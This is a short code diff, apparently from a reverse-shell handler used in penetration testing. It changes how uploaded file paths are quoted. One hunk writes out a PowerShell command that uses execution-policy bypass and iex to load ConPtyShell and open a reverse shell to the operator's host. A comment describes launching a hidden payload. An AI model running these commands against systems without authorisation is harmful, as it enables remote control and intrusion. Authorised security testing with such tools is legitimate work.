@@ -669,7 +669,7 @@ class MainMenu(BetterCMD):
 			conptyshell_path = uploaded[0]
 			shell_type = 'cmd' if session.subtype == 'cmd' else 'powershell'
 			session.exec(
-				f"powershell -nop -ep bypass -c \"iex(get-content {conptyshell_path} -raw); "
+				f"powershell -nop -ep bypass -c \"iex(get-content '{conptyshell_path}' -raw); "
 				f"Invoke-ConPtyShell -RemoteIp {session._host} "
 				f"-RemotePort {session._port} -Rows 24 -Cols 80 -CommandLine {shell_type}\"",
 				force_cmd=True, raw=True
@@ -3572,13 +3572,17 @@ class Session:
 					logger.error("Data unpacking failed...")
 					return []
 
-		# Present uploads
+		# Present uploads. Paths are returned BARE; callers quote them for
+		# their own transport (shlex.quote on Unix, double quotes in PS/cmd
+		# commands). Pre-wrapped paths caused double-quoting:
+		# 'Start-Process -WindowStyle Hidden ""C:\...""' binds an empty
+		# FilePath on PowerShell, so the payload silently never launched.
 		uploaded_paths = []
 		for item in altnames:
 			if self.OS == "Unix":
-				uploaded_path = shlex.quote(str(Path(destination) / item))
+				uploaded_path = str(Path(destination) / item)
 			elif self.OS == "Windows":
-				uploaded_path = f'"{PureWindowsPath(destination, item)}"'
+				uploaded_path = str(PureWindowsPath(destination, item))
 			logger.info(f"{paint('Uploaded').GREEN_white} {paint(uploaded_path).yellow}")
 			uploaded_paths.append(uploaded_path)
 			print()
